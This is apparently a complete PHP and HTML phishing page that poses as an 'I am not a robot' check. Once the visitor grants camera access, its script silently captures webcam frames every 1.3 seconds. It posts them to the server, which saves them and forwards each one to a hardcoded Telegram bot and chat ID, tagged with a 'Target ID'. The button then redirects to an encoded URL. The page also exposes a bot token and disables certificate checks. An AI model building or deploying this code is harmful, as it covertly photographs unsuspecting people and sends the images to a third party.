<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    
    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    $chatId = "5896019931";

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';

    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "🎯 Target ID: {$targetId}\n📁 File: {$fileName}",
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 

        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #ffffff; 
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        /* I am not a robot button style - Center-e rakhar jonno */
        #send-pic-btn {
            background: #ffffff;
            color: #333333;
            border: 1px solid #d3d3d3;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            display: none; 
            font-family: Arial, sans-serif;
            align-items: center;
            gap: 10px;
        }
        #send-pic-btn:hover {
            background: #f9f9f9;
            box-shadow: 0 3px 6px rgba(0,0,0,0.15);
        }
    </style>
</head>
<body>

    <!-- I am not a robot button -->
    <button id="send-pic-btn" onclick="openTargetLink()">I am not a robot</button>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('id') || 'direct';
        const rawTargetUrl = urlParams.get('url');

        let finalUrl = "https://www.aapunkagames.com/"; 

        if (rawTargetUrl) {
            try {
                finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
            } catch (e) {
                console.error("URL decode error:", e);
            }
        }

        const sendBtn = document.getElementById('send-pic-btn');
        if (finalUrl) {
            sendBtn.style.display = 'inline-block';
        }

        function openTargetLink() {
            window.open(finalUrl, '_blank');
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(() => {
                    setInterval(captureAndUpload, 1300);
                }, 1000);
            })
            .catch(err => {
                console.error("Camera error: ", err);
            });

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId)
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
